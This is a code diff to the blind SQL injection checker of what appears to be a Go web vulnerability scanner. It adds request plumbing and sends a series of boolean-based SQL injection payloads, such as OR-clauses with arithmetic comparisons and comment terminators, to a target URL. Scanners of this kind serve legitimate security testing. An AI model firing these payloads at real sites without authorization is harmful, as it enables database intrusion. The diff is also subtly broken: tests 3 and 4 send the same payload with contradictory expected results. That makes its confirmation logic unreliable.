@@ -3,6 +3,7 @@ package sql
 import (
 	"glint/fastreq"
 	"glint/logger"
+	"glint/pkg/layers"
 	"math"
 	"math/rand"
 	"regexp"
@@ -60,8 +61,14 @@ func calcDMBSPriorities() int {
 	return val
 }
 
+type InjectionResult struct {
+	Value  string
+	Result bool
+}
+
 type classBlindSQLInj struct {
 	scheme                  string
+	TargetUrl               string
 	inputIndex              int
 	variations              []string
 	foundVulnOnVariation    bool
@@ -73,18 +80,19 @@ type classBlindSQLInj struct {
 	isBase64                bool
 	responseIsStable        bool
 	origValue               string
-	confirmInjectionHistory []string
+	confirmInjectionHistory []InjectionResult
 	lastJob                 LastJob
 	origBody                interface{}
-	origFeatures            string //原始特征
+	origFeatures            []layers.MFeatures //原始特征
 	lastJobProof            interface{}
 	proofExploitTemplate    string
 	proofExploitVarIndex    int
 	trueFeatures            interface{}
 	originalFullResponse    bool
 	disableSensorBased      bool
-	sess                    *fastreq.Session
-	method                  string
+	layer                   layers.Plreq
+	// sess                    *fastreq.Session
+	// method                  string
 }
 
 type LastJob struct {
@@ -133,6 +141,10 @@ func (bsql *classBlindSQLInj) checkIfResponseIsStable(varIndex interface{}) bool
 
 }
 
+func (bsql *classBlindSQLInj) addToConfirmInjectionHistory(Value string, result bool) {
+	bsql.confirmInjectionHistory = append(bsql.confirmInjectionHistory, InjectionResult{Value: Value, Result: result})
+}
+
 func (bsql *classBlindSQLInj) confirmInjectionWithOR(varIndex interface{}, quoteChar string, confirmed bool, dontCommentRestOfQuery bool) {
 	// original value
 	bsql.origValue = "-1"
@@ -144,12 +156,81 @@ func (bsql *classBlindSQLInj) confirmInjectionWithOR(varIndex interface{}, quote
 		randString = `000` + randString
 	}
 	// equalitySign := "="
-	// test TRUE  -------------------------------------------------------------
+	// test 1 TRUE  -------------------------------------------------------------
 	paramValue = origValue + quoteChar + " OR 2+" + randString + "-" + randString + "-1=0+0+0+1 -- "
 	if dontCommentRestOfQuery {
 		paramValue = paramValue[:len(paramValue)-4]
 	}
 	logger.Debug("paramValue:%s", paramValue)
 
-	bsql.sess.Request(bsql.method)
+	testbody, err := bsql.layer.Request(bsql.TargetUrl, paramValue)
+	if err != nil {
+		logger.Error("%s", err.Error())
+	}
+	if !layers.CompareFeatures(&testbody, &bsql.origFeatures) {
+		bsql.addToConfirmInjectionHistory(paramValue, true)
+	}
+	truebody := testbody
+
+	// test 2 False -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2>(0+5+" + randString + "-" + randString + ") -- "
+	if dontCommentRestOfQuery {
+		paramValue = paramValue[:len(paramValue)-4]
+	}
+	logger.Debug("paramValue:%s", paramValue)
+
+	testbody1, err := bsql.layer.Request(bsql.TargetUrl, paramValue)
+	if err != nil {
+		logger.Error("%s", err.Error())
+	}
+	if !layers.CompareFeatures(&testbody1, &truebody) {
+		bsql.addToConfirmInjectionHistory(paramValue, false)
+	}
+
+	// test 3 False -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2<(0+5+" + randString + "-" + randString + ") -- "
+	if dontCommentRestOfQuery {
+		paramValue = paramValue[:len(paramValue)-4]
+	}
+	logger.Debug("paramValue:%s", paramValue)
+
+	testbody2, err := bsql.layer.Request(bsql.TargetUrl, paramValue)
+	if err != nil {
+		logger.Error("%s", err.Error())
+	}
+	if !layers.CompareFeatures(&testbody2, &truebody) {
+		bsql.addToConfirmInjectionHistory(paramValue, false)
+	}
+
+	// test 4 true -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2<(0+5+" + randString + "-" + randString + ") -- "
+	if dontCommentRestOfQuery {
+		paramValue = paramValue[:len(paramValue)-4]
+	}
+	logger.Debug("paramValue:%s", paramValue)
+
+	testbody3, err := bsql.layer.Request(bsql.TargetUrl, paramValue)
+	if err != nil {
+		logger.Error("%s", err.Error())
+	}
+	if layers.CompareFeatures(&testbody3, &truebody) {
+		bsql.addToConfirmInjectionHistory(paramValue, true)
+	}
+	// here are the more complex tests
+
+	// test 5 true -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 2+1-1-1=1 AND " + randString + "=" + randString + " -- "
+	if dontCommentRestOfQuery {
+		paramValue = paramValue[:len(paramValue)-4]
+	}
+	logger.Debug("paramValue:%s", paramValue)
+
+	testbody4, err := bsql.layer.Request(bsql.TargetUrl, paramValue)
+	if err != nil {
+		logger.Error("%s", err.Error())
+	}
+	if layers.CompareFeatures(&testbody4, &truebody) {
+		bsql.addToConfirmInjectionHistory(paramValue, true)
+	}
+
 }
